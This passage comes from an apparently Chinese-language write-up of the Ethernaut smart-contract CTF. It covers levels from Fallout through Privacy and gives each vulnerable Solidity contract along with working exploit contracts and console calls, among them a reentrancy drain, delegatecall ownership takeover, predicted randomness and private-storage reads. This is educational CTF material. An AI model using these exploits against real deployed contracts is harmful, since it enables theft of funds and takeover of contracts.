class="line">  <span class="function"><span class="keyword">function</span> <span class="title">allocatorBalance</span>(<span class="params">address allocator</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看了一通代码发现Fallout函数不是构造函数，可以直接调用</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">contract</span>.Fal<span class="number">1</span>out()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210617051912925.png" alt="image-20210617051912925"></p>
<h2 id="0x04-Coin-Flip"><a href="#0x04-Coin-Flip" class="headerlink" title="0x04 Coin Flip"></a>0x04 Coin Flip</h2><p>猜硬币游戏，连续猜对十次</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> &#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">flip</span>(<span class="params">bool _guess</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number.sub(<span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue.div(FACTOR);</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要是随机数安全，但是区块链上所有的数据都是公开的，源码中的</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">ui<span class="symbol">nt256</span> blockValue = ui<span class="symbol">nt256</span><span class="comment">(blockhash(block.number.sub(1)</span>));</span><br></pre></td></tr></table></figure>
<p>可以通过</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">uint256(blockhash(<span class="keyword">block</span>.<span class="keyword">number</span> -<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p>获得</p>
<p>编写EXP</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract Exp&#123;</span><br><span class="line">    address public con_addr = <span class="number">0xcf3Ba6B0681183999D8D053fD7F4E4Fa3340A524</span>;</span><br><span class="line">    <span class="comment">// 这个地址改成合约的地址</span></span><br><span class="line">    CoinFlip c = CoinFlip(con_addr);</span><br><span class="line">    uint256 public FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">guess</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number -<span class="number">1</span>));</span><br><span class="line">        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">        bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">        c.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本来想写个for循环，编译器提示我gas不足，会导致交易失败，就不了了之</p>
<p>连续点击十次guess</p>
<p><img src="/2021/06/17/16/image-20210617054852440.png" alt="image-20210617054852440"></p>
<p><img src="/2021/06/17/16/image-20210617054951941.png" alt="image-20210617054951941"></p>
<p>网上找到了一个POC</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> blockHash = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(</span><br><span class="line">    (resolve, reject) =&gt; web3.eth.getBlock(<span class="string">&#x27;latest&#x27;</span>, <span class="function">(<span class="params">error, result</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span>(!error)</span><br><span class="line">          resolve(result[<span class="string">&#x27;hash&#x27;</span>]);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          reject(error);</span><br><span class="line">    &#125;)</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line">contract.flip(<span class="built_in">parseInt</span>((<span class="keyword">await</span> blockHash())[<span class="number">2</span>], <span class="number">16</span>) &gt; <span class="number">8</span>)</span><br></pre></td></tr></table></figure>
<p>果然太牛了</p>
<h2 id="0x05-Telephone"><a href="#0x05-Telephone" class="headerlink" title="0x05 Telephone"></a>0x05 Telephone</h2><p>考察msg.sender与tx.origin不相同</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">changeOwner</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>部署合约EXP调用Telephone即可</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract Exp&#123;</span><br><span class="line">    </span><br><span class="line">    address public con_addr = <span class="number">0x285c2fd96e1582de7fcB314C9e0048B76089936e</span>;</span><br><span class="line">    <span class="comment">// 这个地址改成合约的地址</span></span><br><span class="line">    address public _owner = <span class="number">0xe510Ac7b174D055679d38450c42AD07bC65E0bc9</span>;</span><br><span class="line">    <span class="comment">// 这个地址改成自己的地址</span></span><br><span class="line">    Telephone phone = Telephone(con_addr);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        phone.changeOwner(_owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210617060301242.png" alt="image-20210617060301242"></p>
<h2 id="0x06-Token"><a href="#0x06-Token" class="headerlink" title="0x06 Token"></a>0x06 Token</h2><p>整数乘法溢出</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params">uint _initialSupply</span>) <span class="title">public</span> &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _value</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(balances[msg.sender] - _value &gt;= <span class="number">0</span>);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _owner</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract Exp&#123;</span><br><span class="line">    </span><br><span class="line">    address public con_addr = <span class="number">0xf920AeFe3343D3C8dd9BC4a360e814470300c344</span>;</span><br><span class="line">    <span class="comment">// 这个地址改成合约的地址</span></span><br><span class="line">    address public _owner = <span class="number">0x63C2F14860D68d75dc2837DBD0D0845294291738</span>;</span><br><span class="line">    <span class="comment">// 随意填写一个地址</span></span><br><span class="line">    uint overvalue = <span class="number">21</span>;</span><br><span class="line">    Token token = Token(con_addr);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        token.transfer(_owner,overvalue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210617061736552.png" alt="image-20210617061736552"></p>
<h2 id="0x07-Delegation"><a href="#0x07-Delegation" class="headerlink" title="0x07 Delegation"></a>0x07 Delegation</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params">address _owner</span>) <span class="title">public</span> &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params">address _delegateAddress</span>) <span class="title">public</span> &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result, bytes memory data) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">      <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里<code>Delegation</code>调用了<code>Delegate</code>合约,在其<code>fallback</code>函数中 使用了<code>delegatecall</code></p>
<p>考点在于 Solidity 中支持两种底层调用方式 <code>call</code>和 <code>delegatecall</code></p>
<blockquote>
<p>call 外部调用时，上下文是外部合约 delegatecall 外部调用时，上下文是调用合约</p>
</blockquote>
<p>也就是说通过<code>address(delegate).delegatecall(msg.data);</code>我们能调用<code>delegate</code>的任意函数</p>
<p>这里我们发现只要调用<code>delegate</code>的<code>pwn()</code>函数就好了</p>
<p>在solidty中可以通过method id（函数选择器）来调用函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract.sendTransaction(&#123;<span class="attr">data</span>: web3.utils.sha3(<span class="string">&quot;pwn()&quot;</span>).slice(<span class="number">0</span>,<span class="number">10</span>)&#125;)<span class="comment">//0xdd365b8b</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210617150646354.png" alt></p>
<p><img src="/2021/06/17/16/image-20210617063916725.png" alt="image-20210617063916725"></p>
<h2 id="0X08-Force"><a href="#0X08-Force" class="headerlink" title="0X08 Force"></a>0X08 Force</h2><p>The goal of this level is to make the balance of the contract greater than zero.</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Force &#123;<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                   MEOW ?</span></span><br><span class="line"><span class="comment">         /\_/\   /</span></span><br><span class="line"><span class="comment">    ____/ o o \</span></span><br><span class="line"><span class="comment">  /~____  =ø= /</span></span><br><span class="line"><span class="comment"> (______)__m_m)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span>&#125;</span><br></pre></td></tr></table></figure>
<p>要求合约余额大于零，先试试直接转账</p>
<p><img src="/2021/06/17/16/image-20210617151434286.png" alt="image-20210617151434286"></p>
<p>去反编译看代码，啥也没有，fallback没有payable</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract Contract &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        memory[<span class="number">0x40</span>:<span class="number">0x60</span>] = <span class="number">0x80</span>;</span><br><span class="line">        revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后想到用合约销毁强制转账的方式</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract exp&#123; </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exp</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params">address _target</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    selfdestruct(_target);</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>记得部署的时候打点钱，或者后面转也可以</p>
<p><img src="/2021/06/17/16/image-20210617153930963.png" alt="image-20210617153930963"></p>
<h2 id="0x09-Vault"><a href="#0x09-Vault" class="headerlink" title="0x09 Vault"></a>0x09 Vault</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params">bytes32 _password</span>) <span class="title">public</span> &#123;</span><br><span class="line">    locked = <span class="literal">true</span>;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">bytes32 _password</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (password == _password) &#123;</span><br><span class="line">      locked = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>定义为私有变量只能组织其他合约访问，但是无法阻止公开访问</p>
<p>按照其代码，可以知道password的存储位置是1</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">web3</span><span class="selector-class">.eth</span><span class="selector-class">.getStorageAt</span>(<span class="selector-tag">contract</span><span class="selector-class">.address</span>, 1)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210617154923739.png" alt="image-20210617154923739"></p>
<p><img src="/2021/06/17/16/image-20210617155309438.png" alt="image-20210617155309438"></p>
<p>直接使用</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">contract.unlock(<span class="string">&quot;A very strong secret password :\)&quot;</span>)<span class="regexp">//</span>密码错误</span><br></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">contract</span>.unlock(web<span class="number">3</span>.utils.hexToBytes(&#x27;<span class="number">0</span>x<span class="number">412076657279207374726</span>f<span class="number">6</span>e<span class="number">67207365637265742070617373776</span>f<span class="number">7264203</span>a<span class="number">29</span>&#x27;))</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210617161012697.png" alt="image-20210617161012697"></p>
<h2 id="0x0A-King"><a href="#0x0A-King" class="headerlink" title="0x0A King"></a>0x0A King</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external payable &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">_king</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address payable</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>谁发送大于 king 的金额就能成为新的 king，但是要先把之前的国王的钱退回去才能更改 king。只要我们一直不接受退回的奖金，那我们就能够一直保持 king 的身份，那就把合约的fallback函数不弄成payable就能一直不接受了。当然第一步是先成为King</p>
<p><img src="/2021/06/17/16/image-20210617162135418.png" alt="image-20210617162135418"></p>
<p>此时King是别人</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Attacker&#123;</span><br><span class="line">    <span class="title">constructor</span>(<span class="params">address target</span>) <span class="title">public</span> <span class="title">payable</span>&#123;</span><br><span class="line">        target.call.gas(<span class="number">1000000</span>).value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>给合约转一些钱，是自己成为King，同时不接受退款</p>
<p><img src="/2021/06/17/16/image-20210617170057604.png" alt="image-20210617170057604"></p>
<p><img src="/2021/06/17/16/image-20210617172756652.png" alt="image-20210617172756652"></p>
<p><img src="/2021/06/17/16/image-20210617172746510.png" alt="image-20210617172746510"></p>
<h2 id="0x0B-Re-entrancy"><a href="#0x0B-Re-entrancy" class="headerlink" title="0x0B Re-entrancy"></a>0x0B Re-entrancy</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">address _to</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _who</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result, bytes memory data) = msg.sender.call.value(_amount)(<span class="string">&quot;&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract Reenter &#123;</span><br><span class="line">    Reentrance reentranceContract;</span><br><span class="line">    uint public amount = <span class="number">1</span> ether;    <span class="comment">//withdrawal amount</span></span><br><span class="line">     </span><br><span class="line">    <span class="title">constructor</span>(<span class="params">address payable reentranceContactAddress</span>) <span class="title">public</span> <span class="title">payable</span> &#123;</span><br><span class="line">        reentranceContract = Reentrance(reentranceContactAddress);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initiateAttack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    reentranceContract.donate&#123;<span class="attr">value</span>:amount&#125;(address(<span class="built_in">this</span>));</span><br><span class="line">    <span class="comment">//首先,需要捐赠一些钱</span></span><br><span class="line">    reentranceContract.withdraw(amount);</span><br><span class="line">    <span class="comment">//然后调用合约的withdraw函数提现</span></span><br><span class="line">  &#125;</span><br><span class="line">  fallback() external payable &#123;</span><br><span class="line">    <span class="keyword">if</span> (address(reentranceContract).balance &gt;= <span class="number">0</span> ) &#123;</span><br><span class="line">        reentranceContract.withdraw(amount); </span><br><span class="line">    &#125;<span class="comment">//因为我们接受以太币的时候也会调用我们的回退函数</span></span><br><span class="line">     <span class="comment">//而我们的回退函数中又一次调用了题目合约的withdraw函数</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210617180356753.png" alt="image-20210617180356753"></p>
<p><img src="/2021/06/17/16/image-20210617180252026.png" alt="image-20210617180356753"></p>
<h2 id="0x0C-Elevator"><a href="#0x0C-Elevator" class="headerlink" title="0x0C Elevator"></a>0x0C Elevator</h2><p>直接甩给我们一个可控的接口，题目目标是登顶</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">isLastFloor</span>(<span class="params">uint</span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">bool</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">goTo</span>(<span class="params">uint _floor</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>想要登顶，需要top=true，就需要我们在</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">top = building.isLastFloor(floor);<span class="comment">//isLastFloor()返回true</span></span><br><span class="line"><span class="keyword">if</span> (! building.isLastFloor(_floor))<span class="comment">//isLastFloor()返回false</span></span><br></pre></td></tr></table></figure>
<p>也就是说，我们需要对isLastFloor()函数进行操作，题目在声明 <code>isLastFloor</code> 时，赋予了 view 属性，view 表示函数会读取合约变量，但是不会修改任何合约的状态，再看看题目提示</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Sometimes solidity is not good at keeping promises.</span><br></pre></td></tr></table></figure>
<p>查找了一些资料之后，发现当前 <code>Solidity</code> 编译器没有强制执行 view 函数不能修改状态，所以上述做法就是可行的</p>
<figure class="highlight monkey"><table><tr><td class="code"><pre><span class="line">contract <span class="built_in">exp</span> &#123;</span><br><span class="line">    address <span class="keyword">to</span> = <span class="number">0</span>x62515F83C91cDF26b8014e1c3f48Da3F4B5106cD;</span><br><span class="line">    //修改成你的合约地址</span><br><span class="line">    Elevator <span class="built_in">exp</span> = Elevator(<span class="keyword">to</span>);</span><br><span class="line">    bool <span class="keyword">public</span> flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isLastFloor</span>(</span>uint) <span class="keyword">public</span> returns (bool)&#123;</span><br><span class="line">        flag = !flag;</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(</span>) <span class="keyword">public</span>&#123;</span><br><span class="line">        <span class="built_in">exp</span>.goTo(<span class="number">123</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210619144446168-7093025-7093100.png" alt="image-20210619144446168"></p>
<h2 id="0x0D-Privacy"><a href="#0x0D-Privacy" class="headerlink" title="0x0D Privacy"></a>0x0D Privacy</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = <span class="literal">true</span>;</span><br><span class="line">  uint256 public ID = block.timestamp;</span><br><span class="line">  uint8 private flattening = <span class="number">10</span>;</span><br><span class="line">  uint8 private denomination = <span class="number">255</span>;</span><br><span class="line">  uint16 private awkwardness = uint16(now);</span><br><span class="line">  bytes32[<span class="number">3</span>] private data;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params">bytes32[<span class="number">3</span>] memory _data</span>) <span class="title">public</span> &#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">bytes16 _key</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(_key == bytes16(data[<span class="number">2</span>]));</span><br><span class="line">    locked = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    A bunch of super advanced solidity algorithms...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span></span><br><span class="line"><span class="comment">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span></span><br><span class="line"><span class="comment">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span></span><br><span class="line"><span class="comment">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span></span><br><span class="line"><span class="comment">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之前 <code>Vault</code> 题目的升级版，还是一样，用 <code>getStorageAt()</code> 把链上的数据读出来</p>
